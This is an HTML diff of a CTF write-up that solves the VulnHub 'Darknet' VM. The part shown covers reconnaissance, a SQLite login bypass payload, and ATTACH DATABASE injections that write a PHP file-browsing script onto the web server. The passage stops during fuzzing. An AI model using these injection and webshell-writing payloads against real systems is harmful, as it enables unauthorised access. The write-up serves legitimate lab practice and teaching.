@@ -1,255 +1,124 @@
-<!DOCTYPE html>
-<html lang="en-us">
+<!doctype html><html lang=en>
 <head>
-  <link rel="preload" href="https://leonjza.github.io/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
-  <link rel="preload" href="https://leonjza.github.io/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
-  <link rel="preload" href="https://leonjza.github.io/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
-  <link rel="preload" href="https://leonjza.github.io/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
-  <meta charset="utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <title> rooting darknet | #!/slash/note</title>
-  <link rel = 'canonical' href = 'https://leonjza.github.io/blog/2016/06/16/rooting-darknet/'>
-  <meta name="description" content="[&#39;Caffeine fueled&#39;, &#39;(╯°□°)╯︵ ┻━┻&#39;, &#39;Security guy&#39;, &#39;Metalhead&#39;, &#39;I saw your password&#39;, &#39;KOOBo&#43;KXleKAv&#43;KXlSnjgaM=&#39;]">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="robots" content="all,follow">
-  <meta name="googlebot" content="index,follow,snippet,archive">
-  <meta property="og:title" content="rooting darknet" />
+<title>
+rooting darknet ::
+#!/bin/note
+— a checkbox uncheckers notepad
+</title>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=description content="Its been a while since I have done a vulnerable boot2root from @VulnHub. So, I decided to pick up where I last left. After paging back from the latest VM&amp;rsquo;s to where I roughly stopped last year, my attention was drawn to Darknet by @Q3rv0.
+ This is how I managed to solve a VM that totally kicked my ass! While I was solving this VM, I also tried out a Kali Docker image! This actually worked out great.
+">
+<meta name=keywords content="darknet,vulnhub,ctf,writeup">
+<meta name=robots content="noodp">
+<link rel=canonical href=https://leonjza.github.io/blog/2016/06/16/rooting-darknet/>
+<link rel=stylesheet href=https://leonjza.github.io/assets/style.css>
+<link rel=stylesheet href=https://leonjza.github.io/style.css>
+<link rel=apple-touch-icon-precomposed sizes=144x144 href=https://leonjza.github.io/img/apple-touch-icon-144-precomposed.png>
+<link rel="shortcut icon" href=https://leonjza.github.io/img/favicon.png>
+<link href=https://leonjza.github.io/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=https://leonjza.github.io/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=https://leonjza.github.io/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=https://leonjza.github.io/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=https://leonjza.github.io/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=https://leonjza.github.io/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<meta name=twitter:card content="summary">
+<meta name=twitter:title content="rooting darknet">
+<meta name=twitter:description content="Its been a while since I have done a vulnerable boot2root from @VulnHub. So, I decided to pick up where I last left. After paging back from the latest VM&rsquo;s to where I roughly stopped last year, my attention was drawn to Darknet by @Q3rv0.
+
+  
+    
+    
+  
+
+
+This is how I managed to solve a VM that totally kicked my ass! While I was solving this VM, I also tried out a Kali Docker image! This actually worked out great.">
+<meta property="og:title" content="rooting darknet">
 <meta property="og:description" content="Its been a while since I have done a vulnerable boot2root from @VulnHub. So, I decided to pick up where I last left. After paging back from the latest VM&rsquo;s to where I roughly stopped last year, my attention was drawn to Darknet by @Q3rv0.
 
-
-
-This is how I managed to solve a VM that totally kicked my ass! While I was solving this VM, I also tried out a Kali Docker image! This actually worked out great." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://leonjza.github.io/blog/2016/06/16/rooting-darknet/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2016-06-16T21:54:55+02:00" />
-<meta property="article:modified_time" content="2016-06-16T21:54:55+02:00" />
-
-
-  <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="rooting darknet"/>
-<meta name="twitter:description" content="Its been a while since I have done a vulnerable boot2root from @VulnHub. So, I decided to pick up where I last left. After paging back from the latest VM&rsquo;s to where I roughly stopped last year, my attention was drawn to Darknet by @Q3rv0.
-
-
-
-This is how I managed to solve a VM that totally kicked my ass! While I was solving this VM, I also tried out a Kali Docker image! This actually worked out great."/>
-
-  
   
     
-  
-  
-  <link rel="stylesheet" href="https://leonjza.github.io/css/styles.c05d68261bf086a9d7713c4f8a6215a3601608e267a816a7ee58f139b3d1aae51222aae2081c8e0c6bd35e1334773b7a16283022f31f92afd93bb37e5e822e66.css" integrity="sha512-wF1oJhvwhqnXcTxPimIVo2AWCOJnqBan7ljxObPRquUSIqriCByODGvTXhM0dzt6FigwIvMfkq/ZO7N&#43;XoIuZg=="> 
-
-  
-   <link rel="stylesheet" href="https://leonjza.github.io/css/cactus-custom.css"> 
-  
-    <!--[if lt IE 9]>
-      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
-      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
-    <![endif]-->
-  
-
-  
-<link rel="icon" type="image/png" href="https://leonjza.github.io/images/favicon.ico" />
-
-  
-  
-  
-  
-  
     
-<script type="application/javascript">
-var doNotTrack = false;
-if (!doNotTrack) {
-	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
-	ga('create', 'UA-44457032-2', 'auto');
-	
-	ga('send', 'pageview');
-}
-</script>
-<script async src='https://www.google-analytics.com/analytics.js'></script>
+  
 
-  
-  
+
+This is how I managed to solve a VM that totally kicked my ass! While I was solving this VM, I also tried out a Kali Docker image! This actually worked out great.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://leonjza.github.io/blog/2016/06/16/rooting-darknet/"><meta property="article:section" content="posts">
+<meta property="article:published_time" content="2016-06-16T21:54:55+02:00">
+<meta property="article:modified_time" content="2016-06-16T21:54:55+02:00"><meta property="og:site_name" content="#!/bin/note
+">
 </head>
-
-<body class="max-width mx-auto px3 ltr">
-  <div class="content index py4">
-
-  <div id="header-post">
-  <a id="menu-icon" href="#" class="active"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
-  <span id="menu" style="visibility: visible;">
-    <span id="nav">
-      <ul>
-         
-        <li><a href="https://leonjza.github.io/">Home</a></li>
-         
-        <li><a href="https://leonjza.github.io/categories">Categories</a></li>
-         
-        <li><a href="https://leonjza.github.io/posts">Posts</a></li>
-         
-        <li><a href="https://leonjza.github.io/about/">About Me</a></li>
-        
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li>
-          <a class="icon" href=" https://leonjza.github.io/blog/2016/01/09/kerberos-kerberoast-and-golden-tickets/" aria-label="Previous">
-            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
-          </a>
-        </li>
-        
-        
-        <li>
-          <a class="icon" href="https://leonjza.github.io/blog/2016/07/09/awesome-nmap-grep/" aria-label="Next">
-            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
-          </a>
-        </li>
-        
-        <li>
-          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
-            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
-          </a>
-        </li>
-        <li>
-          <a class="icon" href="#" aria-label="Share">
-            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
-          </a>
-        </li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">Previous post</span>
-      <span id="i-next" class="info" style="display:none;">Next post</span>
-      <span id="i-top" class="info" style="display:none;">Back to top</span>
-      <span id="i-share" class="info" style="display:none;">Share post</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      
-      <ul>
-  
-  
-    
-  
-  
-  <li>
-    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f06%2f16%2frooting-darknet%2f" aria-label="Facebook">
-      <i class="fab fa-facebook " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f06%2f16%2frooting-darknet%2f&text=rooting%20darknet" aria-label="Twitter">
-      <i class="fab fa-twitter " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f06%2f16%2frooting-darknet%2f&title=rooting%20darknet" aria-label="Linkedin">
-      <i class="fab fa-linkedin " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f06%2f16%2frooting-darknet%2f&is_video=false&description=rooting%20darknet" aria-label="Pinterest">
-      <i class="fab fa-pinterest " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="mailto:?subject=rooting%20darknet&body=Check out this article: https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f06%2f16%2frooting-darknet%2f" aria-label="Email">
-      <i class="fas fa-envelope " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f06%2f16%2frooting-darknet%2f&title=rooting%20darknet" aria-label="Pocket">
-      <i class="fab fa-get-pocket " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f06%2f16%2frooting-darknet%2f&title=rooting%20darknet" aria-label="reddit">
-      <i class="fab fa-reddit " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f06%2f16%2frooting-darknet%2f&name=rooting%20darknet&description=%3cp%3eIts%20been%20a%20while%20since%20I%20have%20done%20a%20vulnerable%20boot2root%20from%20%3ca%20href%3d%22https%3a%2f%2ftwitter.com%2fvulnhub%22%3e%40VulnHub%3c%2fa%3e.%20So%2c%20I%20decided%20to%20pick%20up%20where%20I%20last%20left.%20After%20paging%20back%20from%20the%20latest%20VM%26rsquo%3bs%20to%20where%20I%20roughly%20stopped%20last%20year%2c%20my%20attention%20was%20drawn%20to%20%3ca%20href%3d%22https%3a%2f%2fwww.vulnhub.com%2fentry%2fdarknet-10%2c120%2f%22%3eDarknet%3c%2fa%3e%20by%20%3ca%20href%3d%22https%3a%2f%2ftwitter.com%2fQ3rv0%22%3e%40Q3rv0%3c%2fa%3e.%3c%2fp%3e%0a%3cfigure%3e%3cimg%20src%3d%22%2fimages%2fdarknet_logo.png%22%2f%3e%0a%3c%2ffigure%3e%0a%0a%3cp%3eThis%20is%20how%20I%20managed%20to%20solve%20a%20VM%20that%20totally%20kicked%20my%20ass%21%20While%20I%20was%20solving%20this%20VM%2c%20I%20also%20tried%20out%20a%20Kali%20Docker%20image%21%20This%20actually%20worked%20out%20great.%3c%2fp%3e" aria-label="Tumblr">
-      <i class="fab fa-tumblr " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f06%2f16%2frooting-darknet%2f&t=rooting%20darknet" aria-label="Hacker News">
-      <i class="fab fa-hacker-news " aria-hidden="true"></i>
-    </a>
-  </li>
+<body class=dark-theme>
+<div class=container>
+<header class=header>
+<span class=header__inner>
+<a href=/ class=logo style=text-decoration:none>
+<span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
+</span>
+<span class=logo__text>#!/bin/note
+</span>
+<span class=logo__cursor></span>
+</a>
+<span class=header__right>
+<nav class=menu>
+<ul class="menu__inner menu__inner--desktop">
+<li><a href=/about/>About Me</a></li>
+<li><a href=/categories>Categories</a></li>
+<li><a href=/posts>Posts</a></li>
 </ul>
-
-    </div>
-    <div id="toc">
-      <nav id="TableOfContents">
-  <ul>
-    <li><a href="#getting-started">getting started</a></li>
-    <li><a href="#888darknetcom">888.darknet.com</a></li>
-    <li><a href="#888-authentication-bypass">888 authentication bypass</a></li>
-    <li><a href="#administrator-sql-shell">administrator sql shell</a></li>
-    <li><a href="#signal8-so-much-hate">signal8. so much hate.</a></li>
-    <li><a href="#xpath-injection">xpath injection</a></li>
-  </ul>
-
-  <ul>
-    <li><a href="#the-last-hurdles">the last hurdle(s)</a></li>
-    <li><a href="#flag">flag</a></li>
-    <li><a href="#final-thoughts">final thoughts</a></li>
-  </ul>
+<ul class="menu__inner menu__inner--mobile">
+<li><a href=/about/>About Me</a></li>
+<li><a href=/categories>Categories</a></li>
+<li><a href=/posts>Posts</a></li>
+</ul>
 </nav>
-    </div>
-  </span>
+<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
+</span>
+<span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg>
+</span>
+</span>
+</span>
+</header>
+<div class=content>
+<div class=post>
+<h1 class=post-title>rooting darknet</h1>
+<div class=post-meta>
+<span class=post-date>
+2016-06-16
+</span>
+<span class=post-read-time>— 22 min read</span>
 </div>
-
-
-  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
-    <header>
-      <h1 class="posttitle" itemprop="name headline">
-        rooting darknet
-      </h1>
-      <div class="meta">
-        
-        <div class="postdate">
-          
-          <time datetime="2016-06-16 21:54:55 &#43;0200 SAST" itemprop="datePublished">2016-06-16</time>
-          
-        </div>
-        
-        
-        
-        <div class="article-category">
-            <i class="fas fa-archive"></i>
-            
-            
-            <a class="category-link" href="https://leonjza.github.io/categories/ctf">ctf</a>
-            
-             ,  
-            <a class="category-link" href="https://leonjza.github.io/categories/vulnerable-vm">vulnerable vm</a>
-            
-             ,  
-            <a class="category-link" href="https://leonjza.github.io/categories/vulnhub">vulnhub</a>
-            
-             ,  
-            <a class="category-link" href="https://leonjza.github.io/categories/solution">solution</a>
-            
-        </div>
-        
-        
-      </div>
-    </header>
-
-  
-    <div class="content" itemprop="articleBody">
-      <p>Its been a while since I have done a vulnerable boot2root from <a href="https://twitter.com/vulnhub">@VulnHub</a>. So, I decided to pick up where I last left. After paging back from the latest VM&rsquo;s to where I roughly stopped last year, my attention was drawn to <a href="https://www.vulnhub.com/entry/darknet-10,120/">Darknet</a> by <a href="https://twitter.com/Q3rv0">@Q3rv0</a>.</p>
-<figure><img src="https://leonjza.github.io/images/darknet_logo.png"/>
+<div class=post-content>
+<h2>Table of Contents</h2>
+<aside class=table-of-contents><nav id=TableOfContents>
+<ul>
+<li>
+<ul>
+<li><a href=#getting-started>getting started</a></li>
+<li><a href=#888darknetcom>888.darknet.com</a></li>
+<li><a href=#888-authentication-bypass>888 authentication bypass</a></li>
+<li><a href=#administrator-sql-shell>administrator sql shell</a></li>
+<li><a href=#signal8-so-much-hate>signal8. so much hate.</a></li>
+<li><a href=#xpath-injection>xpath injection</a></li>
+</ul>
+</li>
+<li><a href=#the-ploy>the ploy</a>
+<ul>
+<li><a href=#the-last-hurdles>the last hurdle(s)</a></li>
+<li><a href=#flag>flag</a></li>
+<li><a href=#final-thoughts>final thoughts</a></li>
+</ul>
+</li>
+</ul>
+</nav></aside>
+<p>Its been a while since I have done a vulnerable boot2root from <a href=https://twitter.com/vulnhub>@VulnHub</a>. So, I decided to pick up where I last left. After paging back from the latest VM&rsquo;s to where I roughly stopped last year, my attention was drawn to <a href=https://www.vulnhub.com/entry/darknet-10,120/>Darknet</a> by <a href=https://twitter.com/Q3rv0>@Q3rv0</a>.</p>
+<figure class=left>
+<img src=/images/darknet_logo.png>
 </figure>
-
 <p>This is how I managed to solve a VM that totally kicked my ass! While I was solving this VM, I also tried out a Kali Docker image! This actually worked out great.</p>
-<h2 id="getting-started">getting started</h2>
+<h2 id=getting-started>getting started</h2>
 <p>Starting with these VM&rsquo;s is almost always the same story and Darknet was no different. Pick up the VM&rsquo;s IP address (yes, I still use the VMWare network sniffer <code>sudo /Applications/VMware\ Fusion.app/Contents/Library/vmnet-sniffer -e vmnet8</code>). <strong>192.168.252.140</strong>. On to the <code>nmap</code>!</p>
 <pre><code>root@kali:~# nmap -v --reason 192.168.252.140 -sV
 
@@ -262,10 +131,10 @@ PORT    STATE SERVICE REASON         VERSION
 80/tcp  open  http    syn-ack ttl 37 Apache httpd 2.2.22 ((Debian))
 111/tcp open  rpcbind syn-ack ttl 37 2-4 (RPC #100000)
 </code></pre><p>Just <code>tcp/80</code> to work with really. <code>tcp/111</code> did not yield anything interesting at first glance, but the most obvious next step was definitely the web port.</p>
-<figure><img src="https://leonjza.github.io/images/darknet_homepage.png"/>
+<figure class=left>
+<img src=/images/darknet_homepage.png>
 </figure>
-
-<h2 id="888darknetcom">888.darknet.com</h2>
+<h2 id=888darknetcom>888.darknet.com</h2>
 <p>The homepage on the web server I have found so far was not very interesting. I scanned it with <code>gobuster</code> hoping to discover some more directories which revealed the existence of an <code>/access</code> folder.</p>
 <pre><code>root@kali:~# gobuster -u http://192.168.252.140/ -w /usr/share/wordlists/wfuzz/general/common.txt
 
@@ -281,10 +150,10 @@ Gobuster v1.1                OJ Reeves (@TheColonial)
 /index (Status: 200)
 =====================================================
 </code></pre><p>Browsing to http://192.168.252.140/access/ showed that directory indexing was enabled and revealed the <code>888.darknet.com.backup</code> file.</p>
-<figure><img src="https://leonjza.github.io/images/darknet_access_folder.png"/>
+<figure class=left>
+<img src=/images/darknet_access_folder.png>
 </figure>
-
-<p>Downloading and inspecting the file, it quickly became apparent that this looked like an <a href="https://httpd.apache.org/docs/current/vhosts/examples.html">Apache Virtual Host</a> configuration.</p>
+<p>Downloading and inspecting the file, it quickly became apparent that this looked like an <a href=https://httpd.apache.org/docs/current/vhosts/examples.html>Apache Virtual Host</a> configuration.</p>
 <pre><code>root@kali:~/data/VulnHub/Darknet# cat 888.darknet.com.backup
 &lt;VirtualHost *:80&gt;
     ServerName 888.darknet.com
@@ -293,16 +162,16 @@ Gobuster v1.1                OJ Reeves (@TheColonial)
     ErrorLog /home/devnull/logs
 &lt;/VirtualHost&gt;
 </code></pre><p>I took this as a hint that I would have to hack an entry into my local <code>/etc/hosts</code> to resolve <em>888.darknet.com</em> to <em>192.168.252.140</em>. After having done that, we are presented with yet another page with a login.</p>
-<figure><img src="https://leonjza.github.io/images/darknet_888_login.png"/>
+<figure class=left>
+<img src=/images/darknet_888_login.png>
 </figure>
-
-<h2 id="888-authentication-bypass">888 authentication bypass</h2>
-<p>Natural instinct has it that when you see login pages like these, you just throw some single quotes at the fields to see what happens. I did exactly this and was pleasantly met with an error response along the lines of <code>unrecognized token: &quot;3590cb8af0bbb9e78c343b52b93773c9&quot;</code>. This just <strong>screamed</strong> SQL injection! I figured since it seems to be reflecting errors back at the page, <code>sqlmap</code> might just quickly sort out this stage for us without much effort. <strong>Nope!</strong> After quite a bit of time, I learnt that the SQL injection only appears to be in the <code>username</code> field, but no matter how I tried to get <code>sqlmap</code> to play along, I was inevitably met with <code>[WARNING] POST parameter 'username' is not injectable</code> every time.</p>
-<p>Admitting defeat, I figured I should stop being lazy and attempt the injection manually. The fact that the error message returned <code>unrecognized token</code> hinted towards the idea that the backend database might be SQLite. This gives me a frame of reference for the SQL dialect to use. Next, the most critical step for the injection to be successful was to try and envision what the query must look like in the backend. I played around quite a bit more, and got he most information out of the error message when I have the value <code>'&quot;1</code> as a username and any text as a password.</p>
-<figure><img src="https://leonjza.github.io/images/darknet_888_login_error.png"/>
+<h2 id=888-authentication-bypass>888 authentication bypass</h2>
+<p>Natural instinct has it that when you see login pages like these, you just throw some single quotes at the fields to see what happens. I did exactly this and was pleasantly met with an error response along the lines of <code>unrecognized token: "3590cb8af0bbb9e78c343b52b93773c9"</code>. This just <strong>screamed</strong> SQL injection! I figured since it seems to be reflecting errors back at the page, <code>sqlmap</code> might just quickly sort out this stage for us without much effort. <strong>Nope!</strong> After quite a bit of time, I learnt that the SQL injection only appears to be in the <code>username</code> field, but no matter how I tried to get <code>sqlmap</code> to play along, I was inevitably met with <code>[WARNING] POST parameter 'username' is not injectable</code> every time.</p>
+<p>Admitting defeat, I figured I should stop being lazy and attempt the injection manually. The fact that the error message returned <code>unrecognized token</code> hinted towards the idea that the backend database might be SQLite. This gives me a frame of reference for the SQL dialect to use. Next, the most critical step for the injection to be successful was to try and envision what the query must look like in the backend. I played around quite a bit more, and got he most information out of the error message when I have the value <code>'"1</code> as a username and any text as a password.</p>
+<figure class=left>
+<img src=/images/darknet_888_login_error.png>
 </figure>
-
-<p>Great. So with <code>&quot;&quot;1' and pass='03c7c0ace395d80182db07ae2c30f034'&quot;</code> as the error message, I theorized that the SQL query might be something along the lines of:</p>
+<p>Great. So with <code>""1' and pass='03c7c0ace395d80182db07ae2c30f034'"</code> as the error message, I theorized that the SQL query might be something along the lines of:</p>
 <pre><code>SELECT * FROM users WHERE user='&lt;INJECT&gt;' and pass='&lt;MD5 OF PASS&gt;'
 </code></pre><p>In the softwares logic then, there may be a requirement to just have a row return to mark the session as logged in. Makes sense right? :) So, in order to attempt an authentication bypass, I will need to try and get the query manipulated in such a way that the query will return a valid row regardless of the password. In SQL, we can have something like <code>SELECT 1</code> which will just return <code>1</code> in the row set.</p>
 <pre><code>root@kali:~/data/VulnHub/Darknet# sqlite3
@@ -316,17 +185,17 @@ sqlite&gt;
 </code></pre><p>With this knowledge, we can imagine that we could have the final query the software will execute look something like this:</p>
 <pre><code>SELECT * FROM users WHERE user='a user' or '1' and pass='&lt;MD5 OF PASS&gt;'
 </code></pre><p>In other words, if the injection point is in the <code>user</code> section, the payload we need to execute may be derived as follows:</p>
-<p><code>SELECT * FROM users WHERE user='</code> <strong>a user' or &lsquo;1</strong> <code>' and pass='&lt;MD5 OF PASS&gt;'</code></p>
+<p><code>SELECT * FROM users WHERE user='</code> <strong>a user' or &lsquo;1</strong> <code>' and pass='&lt;MD5 OF PASS>'</code></p>
 <p>This obviously begs the requirement to have knowledge of a valid user! Well, remember that Apache Virtual host config file? It mentioned that the server admin is <code>devnull@darknet.com</code>. Admittedly, this took me a while to get to (and maybe a bit of a cheat :P), but using a username of <code>devnull</code> will complete the requirements we have to bypass the authentication needed for this page.</p>
 <p>Considering the injection point and theorized query, we can use a username of <code>devnull' or 1'</code> and any password to login.</p>
-<h2 id="administrator-sql-shell">administrator sql shell</h2>
+<h2 id=administrator-sql-shell>administrator sql shell</h2>
 <p>After the login bypass, I was presented with a page titled <strong>Administrador SQL</strong>.</p>
-<figure><img src="https://leonjza.github.io/images/darknet_888_administrator_sql.png"/>
+<figure class=left>
+<img src=/images/darknet_888_administrator_sql.png>
 </figure>
-
 <p>I tried a few queries but quickly realized that no output was returned no matter what you gave it.</p>
-<p>While researching some of the possibilities with SQLite injection, I came across <a href="http://gwae.trollab.org/sqlite-injection.html">this</a> blogpost that details a method of writing arbitrary code to a file of our choosing (obviously assuming we have write access there). Considering I had a fictitious <em>SQL shell</em> now, I jumped right into trying this.</p>
-<p>The first thing I needed to do though was to find a writable directory. The blogpost mentions that <code>uploads/</code> and <code>cache/</code> are usually good candidates (and rightfully so), but it did not seem like the paths existed at <a href="http://888.darknet.com/uploads/">http://888.darknet.com/uploads/</a> and <a href="http://888.darknet.com/cache/">http://888.darknet.com/cache/</a>. So I pulled up <code>gobuster</code> again to see if there are any other directories I could potentially use for this.</p>
+<p>While researching some of the possibilities with SQLite injection, I came across <a href=http://gwae.trollab.org/sqlite-injection.html>this</a> blogpost that details a method of writing arbitrary code to a file of our choosing (obviously assuming we have write access there). Considering I had a fictitious <em>SQL shell</em> now, I jumped right into trying this.</p>
+<p>The first thing I needed to do though was to find a writable directory. The blogpost mentions that <code>uploads/</code> and <code>cache/</code> are usually good candidates (and rightfully so), but it did not seem like the paths existed at <a href=http://888.darknet.com/uploads/>http://888.darknet.com/uploads/</a> and <a href=http://888.darknet.com/cache/>http://888.darknet.com/cache/</a>. So I pulled up <code>gobuster</code> again to see if there are any other directories I could potentially use for this.</p>
 <pre><code>root@kali:~/data/VulnHub/Darknet# gobuster -u http://888.darknet.com/ -w /usr/share/wordlists/wfuzz/general/common.txt
 
 Gobuster v1.1                OJ Reeves (@TheColonial)
@@ -345,46 +214,47 @@ Gobuster v1.1                OJ Reeves (@TheColonial)
 <pre><code>ATTACH DATABASE '/home/devnull/public_html/img/phpinfo.php' as pwn;
 CREATE TABLE pwn.shell (code TEXT);
 INSERT INTO pwn.shell (code) VALUES ('&lt;?php phpinfo(); ?&gt;');
-</code></pre><figure><img src="https://leonjza.github.io/images/darknet_888_phpinfo.png"/>
+</code></pre>
+<figure class=left>
+<img src=/images/darknet_888_phpinfo.png>
 </figure>
-
-<p>Yeah&hellip; look at that. The amount of <code>disable_functions</code> values explain why my initial <code>system()</code> type PHP shells were failing. Nonetheless, I was still able to browse the filesystem with a very rudementary script injected using the SQL shell I still had. The payload was as follows that allowed me to browse around and cat things.</p>
+<p>Yeah&mldr; look at that. The amount of <code>disable_functions</code> values explain why my initial <code>system()</code> type PHP shells were failing. Nonetheless, I was still able to browse the filesystem with a very rudementary script injected using the SQL shell I still had. The payload was as follows that allowed me to browse around and cat things.</p>
 <pre><code>ATTACH DATABASE '/home/devnull/public_html/img/files.php' as pwn;
 CREATE TABLE pwn.shell (code TEXT);
 INSERT INTO pwn.shell (code) VALUES (&quot;&lt;?php if($_GET['a'] == 'ls') { print_r(scandir($_GET['p'])); } if($_GET['a'] == 'cat') { print_r(readfile($_GET['p'])); } ?&gt;&quot;);
 </code></pre><p>Looking at the <code>phpinfo()</code> output, I also noticed the <code>open_basedir</code> value was set to <code>/etc/apache2:/home/devnull:/tmp</code>. This is kinda what motivated me to slap together that quick file browsing script so that I can see whats so interesting in <code>/etc/apache2</code> (especially since we already had this one vhost config requirement to get to this stage).</p>
-<p>Lastly, I also learnt that we are currently the <code>devnull</code> user on a Debian Linux box&hellip; Weird. I expected something like <code>www-data</code> but ok.</p>
-<figure><img src="https://leonjza.github.io/images/darknet_888_id.png"/>
+<p>Lastly, I also learnt that we are currently the <code>devnull</code> user on a Debian Linux box&mldr; Weird. I expected something like <code>www-data</code> but ok.</p>
+<figure class=left>
+<img src=/images/darknet_888_id.png>
 </figure>
-
 <p>Getting back to the <code>/etc/apache2</code> thing, I found another VirtualHost configuration file there in <code>/etc/apache2/sites-available/</code>. This was done using the <code>files.php</code> script I wrote and toggling the <code>a</code> parameter to <code>ls</code> or <code>cat</code> as needed. I was not able to find anything else interesting thanks to that epic <code>open_basedir</code> setting :/</p>
-<figure><img src="https://leonjza.github.io/images/darknet_888_signal8.png"/>
+<figure class=left>
+<img src=/images/darknet_888_signal8.png>
 </figure>
-
-<h2 id="signal8-so-much-hate">signal8. so much hate.</h2>
+<h2 id=signal8-so-much-hate>signal8. so much hate.</h2>
 <p>I added another entry to my <code>/etc/hosts</code> and browsed to the new hostname discovered in that configuration file.</p>
-<figure><img src="https://leonjza.github.io/images/darknet_signal8_home.png"/>
+<figure class=left>
+<img src=/images/darknet_signal8_home.png>
 </figure>
-
 <p>Poking around with the new website had a few points of interest but nothing that had any obvious bugs. The URL <a href="http://signal8.darknet.com/contact.php?id=1">http://signal8.darknet.com/contact.php?id=1</a> had something funny going on with the <code>id</code> field though I could not confirm if this was another SQL injection bug or not. A <code>robots.txt</code> also existed for this site and had the entry <code>Disallow: /xpanel/</code>. Browsing to this I was met with a login page.</p>
-<figure><img src="https://leonjza.github.io/images/darknet_signal8_xpanel.png"/>
+<figure class=left>
+<img src=/images/darknet_signal8_xpanel.png>
 </figure>
-
 <p>The login page too did not seem to have any obvious bugs. Some quick scans with <code>nikto</code>, <code>sqlmap</code> etc did not show me anything I did not already know.</p>
 <p><em>fast forward many many hours</em></p>
 <p>Eventually, I resorted to fuzzing all of the fields in the new site that I have found. I literally tested all of them, but again let me not bore you with the failed attempts ;) I will however detail the path that lead to success.</p>
 <p>To fuzz all of the input fields, I fired up BurpSuite, captured the request to <a href="http://signal8.darknet.com/contact.php?id=1">http://signal8.darknet.com/contact.php?id=1</a> and sent it to Intruder.</p>
-<figure><img src="https://leonjza.github.io/images/darknet_signal8_fuzzing.png"/>
+<figure class=left>
+<img src=/images/darknet_signal8_fuzzing.png>
 </figure>
-
